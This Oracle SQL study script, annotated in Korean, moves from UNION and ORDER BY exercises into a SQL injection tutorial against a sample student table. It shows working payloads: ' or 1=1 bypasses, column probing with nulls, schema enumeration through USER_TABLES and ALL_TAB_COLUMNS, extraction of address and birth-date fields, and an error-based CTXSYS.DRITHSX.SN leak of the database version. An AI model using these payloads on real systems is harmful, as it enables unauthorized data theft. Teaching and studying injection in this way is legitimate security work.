-- union
SELECT clientNo, bsQty from booksale where clientNo ='1'
union
SELECT clientNo, bsQty from booksale where clientNo ='2';

-- 컬럼타입이 동일하면 union 결합이 가능
-- 첫번째 select절 고객번호, 두번재 select 절 도서번호를 추출
-- 고객번호와 도서번호 칼럼 타입이 동일하므로 union 진행
SELECT clientNo, bsQty from booksale where clientNo ='1'
union
SELECT bookNo, bsQty from booksale where clientNo ='2';

-- 컬럼타입이 다름 -> 오류 발생(bsQty, bsDate의 컬럼타입이 다름)
SELECT clientNo, bsQty from booksale where clientNo ='1'
union
SELECT clientNo, bsDate from booksale where clientNo ='2';

-- 여러 테이블에서 조회 결과 결합 가능
-- booksale테이블의 조회 결과와 book테이블의 조회 결과 결합 가능
-- book 테이블의 null과 결합 - null과 결합 시 컬럼 타입에 대한 오류 없음
-- 결과에서 확인 가능한 정보는 book 테이블의 컬럼은 최소 3개 이상임
-- union all 이용시 book테이블의 레코드는 22개임
-- book 테이블의 내용을 잘 몰라도 정보를 얻을 수 있음
select clientNo, bsQty, bookNo from booksale where clientNo = '2'
union all
select null, null, null from book;

-- order by 절 사용
-- 두개의 컬럼만 조회해도 정렬을 조회되지 않는 컬럼을 기준으로 정렬이 가능
SELECT clientNo, bsQty from booksale where clientNo ='2' order by bsQty; -- 조회 하는 컬럼 기준 정렬
SELECT clientNo, bsQty from booksale where clientNo ='2' order by bookNo; -- 조회 되지 않는 컬럼 기준 정렬
SELECT clientNo, bsQty from booksale where clientNo ='2' order by 1; -- 컬럼 idx 이용 정렬 진행
SELECT clientNo, bsQty from booksale where clientNo ='2' order by 6; -- 컬럼 idx 이용 정렬 진행, 없는 idx이므로 오류 발생
-- idx가 없어서 오류가 발생하면 해당 테이블의 컬럼수는 idx보다 작다

-- 오라클은 DUAL이라는 임시 테이블을 사용할 수 있음
-- union절을 통한 Injection 공격을 통해 컬럼의 데이터 타입을 확인 해보려는 시도
-- student의 첫번째 컬럼의 타입은 문자열
SELECT * FROM student where stdNo = ' ' or 1=1
UNION
SELECT 'A', null, null, null, null, null from dual ;

-- 두번째 컬럼의 타입은 문자열
SELECT * FROM student where stdNo = ' ' or 1=1
union
SELECT 'A', 'A', null, null, null, null from dual ;

-- 세번째 컬럼 타입은 문자열이 아님 - 정수타입을 매칭 후 결합 성공 -> 세번째 컬럼 타입은 정수 타입
SELECT * FROM student where stdNo = ' ' or 1=1
union
SELECT 'A', 'A', 1, null, null, null from dual ;

-- USER_TABLES 확인
SELECT * FROM USER_TABLES;

SELECT * FROM STUDENT WHERE STDNO='' OR 1=1
UNION
SELECT TABLE_NAME, null, null, null, null, null FROM USER_TABLES --;

-- ALL_TAB_COLUMNS
SELECT * FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT';

SELECT * FROM STUDENT WHERE STDNO='' OR 1=1
UNION
SELECT TABLE_NAME, null, null, null, null, null FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='STUDENT';

-- STUDENT 테이블 확인
-- 프로그램에서 번호, 이름, 학년 정보 제공
-- 나머지 정보는 UNION 삽입 공격으로 확인
SELECT * FROM STUDENT WHERE STDNO='' OR 1=1
UNION ALL
SELECT STDADDRESS, null, null, null, null, null FROM STUDENT; 

-- STDBIRTH를 문자열로 변환 후 추출

-- STDBIRTH는 데이터 타입 STUDENT 테이블의 5번째 컬럼임
SELECT * FROM STUDENT WHERE STDNO='' OR 1=1
UNION ALL
SELECT TO_CHAR(STDBIRTH), null, null, null, null, null FROM STUDENT; 

-- 현재 사용중인 DBMS 정보를 조회하는 쿼리구문
SELECT banner FROM v$version where banner like '%Oracle%';

-- 위 쿼리에서 사용하는 객체에 대한 권한은 없지만 해당 권한을 가지고 있는 프로시저를 이용하면 간접 확인 가능
-- CTXSYS.DRITHSX.SN(user, (subquery)) 프로시저 활용 : v$version SELECT 권한을 갖고 있음
-- 서브쿼리의 결과가 프로시저가 원하는 형식이 아니기 때문에 오류는 발생 함
-- 발생된 오류에 서브쿼리 결과를 확인할 수 있음
SELECT CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version where banner like '%Oracle%')) FROM dual;
